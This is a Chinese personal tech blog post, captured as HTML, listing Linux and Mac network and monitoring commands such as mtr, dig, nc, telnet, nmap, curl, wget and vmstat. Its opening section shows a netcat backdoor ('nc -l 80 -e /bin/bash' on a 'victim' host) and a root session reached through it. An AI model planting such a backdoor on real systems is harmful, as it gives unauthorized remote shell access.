+<h4 id="创建后门-也叫反弹shell"><a href="#创建后门-也叫反弹shell" class="headerlink" title="创建后门(也叫反弹shell)"></a>创建后门(也叫反弹shell)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">受害者机器主动打开监听。-e为执行被给的命令，“nc -l 80 -e /bin/bash”含义为执行连接端输入的命令</span><br><span class="line">[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 -e /bin/bash</span><br><span class="line"></span><br><span class="line">攻击端(连接端)连接受害者机器80端口，然后输入命令获取受害者机器的信息，从而实现攻击</span><br><span class="line">[skyler@mac ~]# nc 47.98.189.37 80</span><br><span class="line">w</span><br><span class="line"> 11:21:25 up 493 days, 23:11,  1 user,  load average: 0.00, 0.01, 0.05</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     pts/0    210.12.157.87    10:13   13.00s  0.04s  0.00s w</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">uname -a</span><br><span class="line">Linux izbp10lqlgy2g31s41bt94z 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<h2 id="网络状况-网络连通性检测-mtr-dig-ping"><a href="#网络状况-网络连通性检测-mtr-dig-ping" class="headerlink" title="网络状况 - 网络连通性检测 - mtr dig ping"></a>网络状况 - 网络连通性检测 - mtr dig ping</h2><h3 id="检测主机-域名是否可达"><a href="#检测主机-域名是否可达" class="headerlink" title="检测主机/域名是否可达"></a>检测主机/域名是否可达</h3><h4 id="mtr-a-network-diagnostic-tool"><a href="#mtr-a-network-diagnostic-tool" class="headerlink" title="mtr - a network diagnostic tool"></a>mtr - a network diagnostic tool</h4><p>mtr my trace route<br>DESCRIPTION<br>    mtr combines the functionality of the traceroute and ping programs in a single network diagnostic tool.</p>
+<p>常用命令参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-r 如果不使用 -r 参数 mtr 会不断动态运行</span><br><span class="line">-n 选项来让 mtr 只输出 IP，而不对主机 host name 进行解释</span><br></pre></td></tr></table></figure></p>
+<p>常用命令<br>查看本地到 google.com 的路由连接情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtr google.com</span><br></pre></td></tr></table></figure></p>
+<p>输出<br><img src="https://raw.githubusercontent.com/yaoyuanyy/MarkdownPhotos/master/img/20210130202240.png" alt="20210130202240"></p>
+<h4 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig www.baidu.com</span><br></pre></td></tr></table></figure>
+<h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
+<h3 id="检测端口级是否可达"><a href="#检测端口级是否可达" class="headerlink" title="检测端口级是否可达"></a>检测端口级是否可达</h3><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip port</span><br></pre></td></tr></table></figure>
+<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet www.baidu.com 80</span><br></pre></td></tr></table></figure>
+<h4 id="nmap-Network-Mapper"><a href="#nmap-Network-Mapper" class="headerlink" title="nmap - Network Mapper"></a>nmap - Network Mapper</h4><p>主要扫描网络端口，和嗅探网络服务的</p>
+<h5 id="nmap-ips-p-ports"><a href="#nmap-ips-p-ports" class="headerlink" title="nmap ips -p ports"></a>nmap ips -p ports</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ nmap  10.0.1.161  -p1-65535</span><br><span class="line"></span><br><span class="line">Starting Nmap 5.51 ( http://nmap.org ) at 2016-12-29 10:11 CST</span><br><span class="line">Nmap scan report for 10.0.1.161</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">873/tcp   open  rsync</span><br><span class="line">13306/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:56:DE:46 (VMware)</span><br><span class="line"> </span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds</span><br></pre></td></tr></table></figure>
+<h4 id="一键检测"><a href="#一键检测" class="headerlink" title="一键检测"></a>一键检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">多数情况下，可以使用curl一键检测所有过程，如果有问题，再使用上面的命令逐个排查。</span><br><span class="line">curl -v http://www.baidu.com/</span><br></pre></td></tr></table></figure>
+<h2 id="网络下载-文件"><a href="#网络下载-文件" class="headerlink" title="网络下载 - 文件"></a>网络下载 - 文件</h2><h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>NOET: 本文上部分已有</p>
+<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</span><br><span class="line"></span><br><span class="line">curl -O http://www.linux.com/dodo1.JPG</span><br></pre></td></tr></table></figure>
+<h3 id="wget-The-non-interactive-network-downloader"><a href="#wget-The-non-interactive-network-downloader" class="headerlink" title="wget - The non-interactive network downloader"></a>wget - The non-interactive network downloader</h3><p>DESCRIPTION<br>    GNU Wget is a free utility for non-interactive download of files from the Web.  It supports HTTP, HTTPS, and FTP protocols, as well as retrieval through HTTP<br>proxies</p>
+<p>日常用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://www.minjieren.com/wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure></p>
+<p>使用wget -O下载并以不同的文件名保存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$wget -O wordpress.zip http://www.minjieren.com/download.aspx?id=1080</span><br></pre></td></tr></table></figure></p>
+<h2 id="本机网络信息情况-mem-cpu-io-disk"><a href="#本机网络信息情况-mem-cpu-io-disk" class="headerlink" title="本机网络信息情况 - mem cpu io disk"></a>本机网络信息情况 - mem cpu io disk</h2><h3 id="mem-内存监控"><a href="#mem-内存监控" class="headerlink" title="mem - 内存监控"></a>mem - 内存监控</h3><p>监控内存最常使用的命令有free、vmstat、top等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free：展示内存的已使用和空闲的数量数据</span><br><span class="line">vmstat：报告虚拟内存统计数据</span><br><span class="line">/proc/meminfo：包含了更多更原始的信息，只是看起来不太直观</span><br><span class="line">区别：free为你提供了概要信息，输出结果清晰；/proc/meminfo提供更多更原始的信息，是了解Linux系统内存使用状况的主要接口，我们最常用的”free”、”vmstat”等命令就是通过它获取数据的</span><br></pre></td></tr></table></figure></p>
+<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>参考：<a href="https://songlee24.github.io/2015/09/05/linux-monitor-tools/" target="_blank" rel="noopener">https://songlee24.github.io/2015/09/05/linux-monitor-tools/</a></p>
+<h4 id="vmstat-Virtual-Meomory-Statistics"><a href="#vmstat-Virtual-Meomory-Statistics" class="headerlink" title="vmstat - Virtual Meomory Statistics"></a>vmstat - Virtual Meomory Statistics</h4><p>vmstat（虚拟内存统计）是对系统的整体情况进行统计，包括内核进程、虚拟内存、磁盘、陷阱和 CPU 活动的统计信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vmstat 2 100      # 2表示刷新间隔，100表示输出次数</span><br></pre></td></tr></table></figure>
+<h3 id="cpu-CPU监控"><a href="#cpu-CPU监控" class="headerlink" title="cpu - CPU监控"></a>cpu - CPU监控</h3><p>top：获取 CPU 和硬盘的使用状态，通常使用使用 top（htop 更佳）<br>iostat：CPU利用情况报告<br>mpstat：CPU实时监控工具</p>
+<h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><h3 id="disk-磁盘监控"><a href="#disk-磁盘监控" class="headerlink" title="disk - 磁盘监控"></a>disk - 磁盘监控</h3><h4 id="df-disk-free"><a href="#df-disk-free" class="headerlink" title="df - disk free"></a>df - disk free</h4><h4 id="du-disk-usage"><a href="#du-disk-usage" class="headerlink" title="du - disk usage"></a>du - disk usage</h4><h3 id="io-io监控"><a href="#io-io监控" class="headerlink" title="io - io监控"></a>io - io监控</h3><h4 id="iotop"><a href="#iotop" class="headerlink" title="iotop"></a>iotop</h4><p>iotop命令 是一个用来监视磁盘I/O使用状况的top类工具。</p>
+<p><a href="https://cloud.tencent.com/developer/article/1004358" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1004358</a><br><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/06_monitor.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/06_monitor.html</a><br><a href="https://shanyue.tech/op/linux-monitor.html#mysql-%E7%9A%84%E6%9C%80%E5%A4%A7%E8%BF%9E%E6%8E%A5%E6%95%B0%E4%B8%8E%E5%BD%93%E5%89%8D%E8%BF%9E%E6%8E%A5%E6%95%B0" target="_blank" rel="noopener">https://shanyue.tech/op/linux-monitor.html#mysql-%E7%9A%84%E6%9C%80%E5%A4%A7%E8%BF%9E%E6%8E%A5%E6%95%B0%E4%B8%8E%E5%BD%93%E5%89%8D%E8%BF%9E%E6%8E%A5%E6%95%B0</a><br><a href="https://wzfou.com/linux-jiankong/" target="_blank" rel="noopener">https://wzfou.com/linux-jiankong/</a><br><a href="https://segmentfault.com/a/1190000038231309" target="_blank" rel="noopener">https://segmentfault.com/a/1190000038231309</a><br><a href="https://songlee24.github.io/2015/09/05/linux-monitor-tools/" target="_blank" rel="noopener">https://songlee24.github.io/2015/09/05/linux-monitor-tools/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>赏个钱</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat_pay.png" alt="Skyler 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Skyler
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://yaoyuanyy.github.io/2021/01/24/linux-mac-网络相关命令分类/" title="linux mac 网络相关命令">https://yaoyuanyy.github.io/2021/01/24/linux-mac-网络相关命令分类/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/linux网络命令/" rel="tag"># linux网络命令</a>
+          
+            <a href="/tags/mac网络命令/" rel="tag"># mac网络命令</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/31/一个程序员的2020得失与感悟/" rel="next" title="一个程序员的2020得失与感悟">
+                <i class="fa fa-chevron-left"></i> 一个程序员的2020得失与感悟
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/02/15/产业互联网-重新定义效率与消费-读后笔记/" rel="prev" title="<产业互联网-重新定义效率与消费>读后笔记">
+                <产业互联网-重新定义效率与消费>读后笔记 <i class="fa fa-chevron-right"></i>
+              </产业互联网-重新定义效率与消费></a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/tao.jpg" alt="Skyler">
+            
+              <p class="site-author-name" itemprop="name">Skyler</p>
+              <p class="site-description motion-element" itemprop="description">个人技术博客</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yaoyuanyy" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yaoyihao1@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://juejin.im/user/585b94018d6d810065d34497/posts" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#网络连接-ip-port-pid"><span class="nav-number">1.</span> <span class="nav-text">网络连接 - ip port pid</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ss-socket-statistics"><span class="nav-number">1.1.</span> <span class="nav-text">ss - socket statistics</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc-arbitrary-任意的-TCP-and-UDP-connections-and-listens"><span class="nav-number">1.2.</span> <span class="nav-text">nc - arbitrary(任意的) TCP and UDP connections and listens</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常用命令参数"><span class="nav-number">1.2.1.</span> <span class="nav-text">常用命令参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用命令"><span class="nav-number">1.2.2.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用netcat实现聊天"><span class="nav-number">1.2.3.</span> <span class="nav-text">使用netcat实现聊天</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用netcat实现文件传输1"><span class="nav-number">1.2.4.</span> <span class="nav-text">使用netcat实现文件传输1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用netcat进行远程端口扫描-即查看远程端口是否开启"><span class="nav-number">1.2.5.</span> <span class="nav-text">使用netcat进行远程端口扫描 - 即查看远程端口是否开启</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口转发"><span class="nav-number">1.2.6.</span> <span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#创建后门-也叫反弹shell"><span class="nav-number">1.2.7.</span> <span class="nav-text">创建后门(也叫反弹shell)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络状况-网络连通性检测-mtr-dig-ping"><span class="nav-number">2.</span> <span class="nav-text">网络状况 - 网络连通性检测 - mtr dig ping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测主机-域名是否可达"><span class="nav-number">2.1.</span> <span class="nav-text">检测主机/域名是否可达</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mtr-a-network-diagnostic-tool"><span class="nav-number">2.1.1.</span> <span class="nav-text">mtr - a network diagnostic tool</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dig"><span class="nav-number">2.1.2.</span> <span class="nav-text">dig</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ping"><span class="nav-number">2.1.3.</span> <span class="nav-text">ping</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测端口级是否可达"><span class="nav-number">2.2.</span> <span class="nav-text">检测端口级是否可达</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nc"><span class="nav-number">2.2.1.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#telnet"><span class="nav-number">2.2.2.</span> <span class="nav-text">telnet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap-Network-Mapper"><span class="nav-number">2.2.3.</span> <span class="nav-text">nmap - Network Mapper</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#nmap-ips-p-ports"><span class="nav-number">2.2.3.1.</span> <span class="nav-text">nmap ips -p ports</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一键检测"><span class="nav-number">2.2.4.</span> <span class="nav-text">一键检测</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络下载-文件"><span class="nav-number">3.</span> <span class="nav-text">网络下载 - 文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#scp"><span class="nav-number">3.1.</span> <span class="nav-text">scp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl"><span class="nav-number">3.2.</span> <span class="nav-text">curl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wget-The-non-interactive-network-downloader"><span class="nav-number">3.3.</span> <span class="nav-text">wget - The non-interactive network downloader</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本机网络信息情况-mem-cpu-io-disk"><span class="nav-number">4.</span> <span class="nav-text">本机网络信息情况 - mem cpu io disk</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mem-内存监控"><span class="nav-number">4.1.</span> <span class="nav-text">mem - 内存监控</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#free"><span class="nav-number">4.1.1.</span> <span class="nav-text">free</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vmstat-Virtual-Meomory-Statistics"><span class="nav-number">4.1.2.</span> <span class="nav-text">vmstat - Virtual Meomory Statistics</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cpu-CPU监控"><span class="nav-number">4.2.</span> <span class="nav-text">cpu - CPU监控</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#top"><span class="nav-number">4.2.1.</span> <span class="nav-text">top</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#disk-磁盘监控"><span class="nav-number">4.3.</span> <span class="nav-text">disk - 磁盘监控</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#df-disk-free"><span class="nav-number">4.3.1.</span> <span class="nav-text">df - disk free</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#du-disk-usage"><span class="nav-number">4.3.2.</span> <span class="nav-text">du - disk usage</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#io-io监控"><span class="nav-number">4.4.</span> <span class="nav-text">io - io监控</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#iotop"><span class="nav-number">4.4.1.</span> <span class="nav-text">iotop</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Skyler</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://skyler.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://yaoyuanyy.github.io/2021/01/24/linux-mac-网络相关命令分类/';
+          this.page.identifier = '2021/01/24/linux-mac-网络相关命令分类/';
+          this.page.title = 'linux mac 网络相关命令';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://skyler.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("z1rh3HBfRJYf4gqQXC1RjVAC-gzGzoHsz", "cFSlIdGSSY8cjFbc0bTewxKq");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
